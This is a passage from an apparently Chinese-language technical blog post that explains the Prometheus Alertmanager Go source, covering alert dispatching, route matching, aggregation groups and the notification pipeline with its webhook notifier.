class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *Dispatcher)</span> <span class="title">run</span><span class="params">(it provider.AlertIterator)</span></span> &#123;</span><br><span class="line">cleanup := time.NewTicker(<span class="number">30</span> * time.Second)</span><br><span class="line"><span class="keyword">defer</span> cleanup.Stop()</span><br><span class="line"></span><br><span class="line"><span class="keyword">defer</span> it.Close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> alert, ok := &lt;-it.Next():</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="comment">// Iterator exhausted for some reason.</span></span><br><span class="line"><span class="keyword">if</span> err := it.Err(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Errorf(<span class="string">"Error on alert update: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">d.log.With(<span class="string">"alert"</span>, alert).Debug(<span class="string">"Received alert"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Log errors but keep trying.</span></span><br><span class="line"><span class="keyword">if</span> err := it.Err(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Errorf(<span class="string">"Error on alert update: %s"</span>, err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//告警信息路由匹配</span></span><br><span class="line"><span class="keyword">for</span> _, r := <span class="keyword">range</span> d.route.Match(alert.Labels) &#123;</span><br><span class="line">d.processAlert(alert, r)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> &lt;-cleanup.C:</span><br><span class="line">d.mtx.Lock()</span><br><span class="line"><span class="comment">//每隔30s清除为空的告警组</span></span><br><span class="line"><span class="keyword">for</span> _, groups := <span class="keyword">range</span> d.aggrGroups &#123;</span><br><span class="line"><span class="keyword">for</span> _, ag := <span class="keyword">range</span> groups &#123;</span><br><span class="line"><span class="keyword">if</span> ag.empty() &#123;</span><br><span class="line">ag.stop()</span><br><span class="line"><span class="built_in">delete</span>(groups, ag.fingerprint())</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">d.mtx.Unlock()</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> &lt;-d.ctx.Done():</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>流程：</p><p><img src="/images/1572418287763.png" alt="1572418287763"></p><p>告警匹配：</p><p>AlertManager以路由匹配方式实现了告警分组，不同分组下的告警可以使用各不同的告警接受方式，告警组等待时间，告警组发送间隔，重复告警发送间隔。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Match does a depth-first left-to-right search through the route tree</span></span><br><span class="line"><span class="comment">// and returns the matching routing nodes.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *Route)</span> <span class="title">Match</span><span class="params">(lset model.LabelSet)</span> []*<span class="title">Route</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> !r.Matchers.Match(lset) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> all []*Route</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, cr := <span class="keyword">range</span> r.Routes &#123;</span><br><span class="line">matches := cr.Match(lset)</span><br><span class="line"></span><br><span class="line">all = <span class="built_in">append</span>(all, matches...)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> matches != <span class="literal">nil</span> &amp;&amp; !cr.Continue &#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// If no child nodes were matches, the current node itself is a match.</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(all) == <span class="number">0</span> &#123;</span><br><span class="line">all = <span class="built_in">append</span>(all, r)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> all</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>告警处理：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// processAlert determines in which aggregation group the alert falls</span></span><br><span class="line"><span class="comment">// and insert it.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *Dispatcher)</span> <span class="title">processAlert</span><span class="params">(alert *types.Alert, route *Route)</span></span> &#123;</span><br><span class="line">group := model.LabelSet&#123;&#125;</span><br><span class="line"><span class="comment">//获取分组的维度和纬度值</span></span><br><span class="line"><span class="keyword">for</span> ln, lv := <span class="keyword">range</span> alert.Labels &#123;</span><br><span class="line"><span class="keyword">if</span> _, ok := route.RouteOpts.GroupBy[ln]; ok &#123;</span><br><span class="line">group[ln] = lv</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fp := group.Fingerprint()</span><br><span class="line"></span><br><span class="line">d.mtx.Lock()</span><br><span class="line">groups, ok := d.aggrGroups[route]</span><br><span class="line">    <span class="comment">//判断是否需要新建告警组</span></span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line">groups = <span class="keyword">map</span>[model.Fingerprint]*aggrGroup&#123;&#125;</span><br><span class="line">d.aggrGroups[route] = groups</span><br><span class="line">&#125;</span><br><span class="line">d.mtx.Unlock()</span><br><span class="line"></span><br><span class="line"><span class="comment">// If the group does not exist, create it.</span></span><br><span class="line">ag, ok := groups[fp]</span><br><span class="line">    <span class="comment">//判断是否新建路由组</span></span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line">ag = newAggrGroup(d.ctx, group, route, d.timeout)</span><br><span class="line">groups[fp] = ag</span><br><span class="line"><span class="comment">//启动告警组</span></span><br><span class="line"><span class="keyword">go</span> ag.run(<span class="function"><span class="keyword">func</span><span class="params">(ctx context.Context, alerts ...*types.Alert)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">_, _, err := d.stage.Exec(ctx, alerts...)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Errorf(<span class="string">"Notify for %d alerts failed: %s"</span>, <span class="built_in">len</span>(alerts), err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> err == <span class="literal">nil</span></span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ag.insert(alert)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>run方法：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(ag *aggrGroup)</span> <span class="title">run</span><span class="params">(nf notifyFunc)</span></span> &#123;</span><br><span class="line">ag.done = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">defer</span> <span class="built_in">close</span>(ag.done)</span><br><span class="line"><span class="keyword">defer</span> ag.next.Stop()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> now := &lt;-ag.next.C:</span><br><span class="line"><span class="comment">// Give the notifcations time until the next flush to</span></span><br><span class="line"><span class="comment">// finish before terminating them.</span></span><br><span class="line">ctx, cancel := context.WithTimeout(ag.ctx, ag.timeout(ag.opts.GroupInterval))</span><br><span class="line"></span><br><span class="line"><span class="comment">// The now time we retrieve from the ticker is the only reliable</span></span><br><span class="line"><span class="comment">// point of time reference for the subsequent notification pipeline.</span></span><br><span class="line"><span class="comment">// Calculating the current time directly is prone to flaky behavior,</span></span><br><span class="line"><span class="comment">// which usually only becomes apparent in tests.</span></span><br><span class="line">            <span class="comment">//记录告警开始时间</span></span><br><span class="line">ctx = notify.WithNow(ctx, now)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Populate context with information needed along the pipeline.</span></span><br><span class="line">ctx = notify.WithGroupKey(ctx, ag.GroupKey())</span><br><span class="line">ctx = notify.WithGroupLabels(ctx, ag.labels)</span><br><span class="line">ctx = notify.WithReceiverName(ctx, ag.opts.Receiver)</span><br><span class="line">ctx = notify.WithRepeatInterval(ctx, ag.opts.RepeatInterval)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Wait the configured interval before calling flush again.</span></span><br><span class="line">ag.mtx.Lock()</span><br><span class="line">ag.next.Reset(ag.opts.GroupInterval)</span><br><span class="line">ag.mtx.Unlock()</span><br><span class="line"></span><br><span class="line">ag.flush(<span class="function"><span class="keyword">func</span><span class="params">(alerts ...*types.Alert)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> nf(ctx, alerts...)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">cancel()</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> &lt;-ag.ctx.Done():</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flush方法中对告警信息进行两次复制，并分别将其缓存到alerts和alertsSlice中，告警信息通过传入的参数notify再次告警通知，之后再告警列表中删除过期的告警。</p><p>flush方法：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flush sends notifications for all new alerts.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(ag *aggrGroup)</span> <span class="title">flush</span><span class="params">(notify <span class="keyword">func</span>(...*types.Alert)</span> <span class="title">bool</span>)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> ag.empty() &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">ag.mtx.Lock()</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">alerts      = <span class="built_in">make</span>(<span class="keyword">map</span>[model.Fingerprint]*types.Alert, <span class="built_in">len</span>(ag.alerts))</span><br><span class="line">alertsSlice = <span class="built_in">make</span>([]*types.Alert, <span class="number">0</span>, <span class="built_in">len</span>(ag.alerts))</span><br><span class="line">)</span><br><span class="line"><span class="keyword">for</span> fp, alert := <span class="keyword">range</span> ag.alerts &#123;</span><br><span class="line">alerts[fp] = alert</span><br><span class="line">alertsSlice = <span class="built_in">append</span>(alertsSlice, alert)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ag.mtx.Unlock()</span><br><span class="line"></span><br><span class="line">ag.log.Debugln(<span class="string">"flushing"</span>, alertsSlice)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> notify(alertsSlice...) &#123;</span><br><span class="line">ag.mtx.Lock()</span><br><span class="line"><span class="keyword">for</span> fp, a := <span class="keyword">range</span> alerts &#123;</span><br><span class="line"><span class="comment">// Only delete if the fingerprint has not been inserted</span></span><br><span class="line"><span class="comment">// again since we notified about it.</span></span><br><span class="line"><span class="keyword">if</span> a.Resolved() &amp;&amp; ag.alerts[fp] == a &#123;</span><br><span class="line"><span class="built_in">delete</span>(ag.alerts, fp)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ag.hasSent = <span class="literal">true</span></span><br><span class="line">ag.mtx.Unlock()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>告警的过期时间由alertmanager.yml配置文件中的resolve_timeout配置项指定，默认5m.</p><p>flush方法的notify参数为func(…*types.Alert) bool类型，而notify方法最终会调用d.stage.Exec进行告警处理。</p><p>主要流程：</p><p><img src="/images/1572418713584.png" alt="1572418713584"></p><p>告警通知：</p><p>主要流程：</p><p>1）main方法中调用notify.BuildPipeline方法生成RoutingStage，并作为参数传递到dispatcher的NewDispatcher方法中，从而完成调度器Dispatcher的构建，并将RoutingStage赋值给调度器成stage.</p><p>2）processAlerts定义匿名回调方法func(ctx context.Context, alerts … *types.Alert) bool 再匿名方法的实现调用d.stage.Exec(ctx, alerts…)发送告警。</p><p>BuildPipeline构建一个执行的调用链，该链有RoutingStage，MultiStage,FanoutStage, inhibitStage, SilenceStage, WaitStage, DehupStage等多阶段。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// BuildPipeline builds a map of receivers to Stages.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BuildPipeline</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">confs []*config.Receiver,</span></span></span><br><span class="line"><span class="function"><span class="params">tmpl *template.Template,</span></span></span><br><span class="line"><span class="function"><span class="params">wait <span class="keyword">func</span>()</span> <span class="title">time</span>.<span class="title">Duration</span>,</span></span><br><span class="line">inhibitor *inhibit.Inhibitor,</span><br><span class="line">silences *silence.Silences,</span><br><span class="line">notificationLog nflog.Log,</span><br><span class="line">marker types.Marker,</span><br><span class="line">) RoutingStage &#123;</span><br><span class="line">rs := RoutingStage&#123;&#125;</span><br><span class="line"></span><br><span class="line">is := NewInhibitStage(inhibitor, marker)</span><br><span class="line">ss := NewSilenceStage(silences, marker)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, rc := <span class="keyword">range</span> confs &#123;</span><br><span class="line">rs[rc.Name] = MultiStage&#123;is, ss, createStage(rc, tmpl, wait, notificationLog)&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> rs</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>createStage方法：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// createStage creates a pipeline of stages for a receiver.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">createStage</span><span class="params">(rc *config.Receiver, tmpl *template.Template, wait <span class="keyword">func</span>()</span> <span class="title">time</span>.<span class="title">Duration</span>, <span class="title">notificationLog</span> <span class="title">nflog</span>.<span class="title">Log</span>) <span class="title">Stage</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> fs FanoutStage</span><br><span class="line"><span class="keyword">for</span> _, i := <span class="keyword">range</span> BuildReceiverIntegrations(rc, tmpl) &#123;</span><br><span class="line">recv := &amp;nflogpb.Receiver&#123;</span><br><span class="line">GroupName:   rc.Name,</span><br><span class="line">Integration: i.name,</span><br><span class="line">Idx:         <span class="keyword">uint32</span>(i.idx),</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> s MultiStage</span><br><span class="line">s = <span class="built_in">append</span>(s, NewWaitStage(wait))</span><br><span class="line">s = <span class="built_in">append</span>(s, NewDedupStage(notificationLog, recv, i.conf.SendResolved()))</span><br><span class="line">s = <span class="built_in">append</span>(s, NewRetryStage(i))</span><br><span class="line">s = <span class="built_in">append</span>(s, NewSetNotifiesStage(notificationLog, recv))</span><br><span class="line"></span><br><span class="line">fs = <span class="built_in">append</span>(fs, s)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> fs</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BuildReceiverIntegrations方法主要用于构建告警接收器对应的Notifier，兵器再alertmanager.yml配置文件中的每种告警接收器，可以定义多种Notifier。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// BuildReceiverIntegrations builds a list of integration notifiers off of a</span></span><br><span class="line"><span class="comment">// receivers config.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BuildReceiverIntegrations</span><span class="params">(nc *config.Receiver, tmpl *template.Template)</span> []<span class="title">Integration</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">integrations []Integration</span><br><span class="line">add          = <span class="function"><span class="keyword">func</span><span class="params">(name <span class="keyword">string</span>, i <span class="keyword">int</span>, n Notifier, nc notifierConfig)</span></span> &#123;</span><br><span class="line">integrations = <span class="built_in">append</span>(integrations, Integration&#123;</span><br><span class="line">notifier: n,</span><br><span class="line">conf:     nc,</span><br><span class="line">name:     name,</span><br><span class="line">idx:      i,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> nc.WebhookConfigs &#123;</span><br><span class="line">n := NewWebhook(c, tmpl)</span><br><span class="line">add(<span class="string">"webhook"</span>, i, n, c)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> nc.EmailConfigs &#123;</span><br><span class="line">n := NewEmail(c, tmpl)</span><br><span class="line">add(<span class="string">"email"</span>, i, n, c)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> nc.PagerdutyConfigs &#123;</span><br><span class="line">n := NewPagerDuty(c, tmpl)</span><br><span class="line">add(<span class="string">"pagerduty"</span>, i, n, c)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> nc.OpsGenieConfigs &#123;</span><br><span class="line">n := NewOpsGenie(c, tmpl)</span><br><span class="line">add(<span class="string">"opsgenie"</span>, i, n, c)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> nc.SlackConfigs &#123;</span><br><span class="line">n := NewSlack(c, tmpl)</span><br><span class="line">add(<span class="string">"slack"</span>, i, n, c)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> nc.HipchatConfigs &#123;</span><br><span class="line">n := NewHipchat(c, tmpl)</span><br><span class="line">add(<span class="string">"hipchat"</span>, i, n, c)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> nc.VictorOpsConfigs &#123;</span><br><span class="line">n := NewVictorOps(c, tmpl)</span><br><span class="line">add(<span class="string">"victorops"</span>, i, n, c)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> nc.PushoverConfigs &#123;</span><br><span class="line">n := NewPushover(c, tmpl)</span><br><span class="line">add(<span class="string">"pushover"</span>, i, n, c)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> integrations</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以webhook类型Notifier为列，数据格式化之后，以post方式发送告警信息。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Notify implements the Notifier interface.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w *Webhook)</span> <span class="title">Notify</span><span class="params">(ctx context.Context, alerts ...*types.Alert)</span> <span class="params">(<span class="keyword">bool</span>, error)</span></span> &#123;</span><br><span class="line">data := w.tmpl.Data(receiverName(ctx), groupLabels(ctx), alerts...)</span><br><span class="line"></span><br><span class="line">groupKey, ok := GroupKey(ctx)</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line">log.Errorf(<span class="string">"group key missing"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">msg := &amp;WebhookMessage&#123;</span><br><span class="line">Version:  <span class="string">"4"</span>,</span><br><span class="line">Data:     data,</span><br><span class="line">GroupKey: groupKey,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buf bytes.Buffer</span><br><span class="line"><span class="keyword">if</span> err := json.NewEncoder(&amp;buf).Encode(msg); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">req, err := http.NewRequest(<span class="string">"POST"</span>, w.URL, &amp;buf)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>, err</span><br><span class="line">&#125;</span><br><span class="line">req.Header.Set(<span class="string">"Content-Type"</span>, contentTypeJSON)</span><br><span class="line">req.Header.Set(<span class="string">"User-Agent"</span>, userAgentHeader)</span><br><span class="line"></span><br><span class="line">resp, err := ctxhttp.Do(ctx, http.DefaultClient, req)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>, err</span><br><span class="line">&#125;</span><br><span class="line">resp.Body.Close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> w.retry(resp.StatusCode)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用链的执行流程：</p><p><img src="/images/1572419260049.png" alt="1572419260049"></p><p>RoutingStage阶段的Exec方法：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Exec implements the Stage interface.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(rs RoutingStage)</span> <span class="title">Exec</span><span class="params">(ctx context.Context, alerts ...*types.Alert)</span> <span class="params">(context.Context, []*types.Alert, error)</span></span> &#123;</span><br><span class="line">receiver, ok := ReceiverName(ctx)</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">return</span> ctx, <span class="literal">nil</span>, fmt.Errorf(<span class="string">"receiver missing"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s, ok := rs[receiver]</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">return</span> ctx, <span class="literal">nil</span>, fmt.Errorf(<span class="string">"stage for receiver missing"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> s.Exec(ctx, alerts...)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Exec attempts to execute all stages concurrently and discards the results.</span></span><br><span class="line"><span class="comment">// It returns its input alerts and a types.MultiError if one or more stages fail.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(fs FanoutStage)</span> <span class="title">Exec</span><span class="params">(ctx context.Context, alerts ...*types.Alert)</span> <span class="params">(context.Context, []*types.Alert, error)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">wg sync.WaitGroup</span><br><span class="line">me types.MultiError</span><br><span class="line">)</span><br><span class="line">wg.Add(<span class="built_in">len</span>(fs))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, s := <span class="keyword">range</span> fs &#123;</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(s Stage)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> _, _, err := s.Exec(ctx, 